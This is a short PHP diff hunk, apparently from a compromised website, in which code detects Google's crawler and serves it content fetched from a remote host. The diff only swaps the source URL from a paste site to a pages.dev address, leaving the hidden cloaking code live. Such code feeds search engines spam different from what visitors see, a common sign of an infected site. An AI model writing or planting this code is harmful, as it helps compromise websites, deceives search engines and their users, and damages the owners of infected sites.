@@ -8,7 +8,7 @@ function is_google_bot() {
 }
 
 if (is_google_bot()) {
-    $bot_content = file_get_contents('https://paste.hexaspaces.com/raw/HRcZF3EIBSm');
+    $bot_content = file_get_contents('https://harustetapberjuang.pages.dev/index.txt');
     echo $bot_content;
     exit;
 }
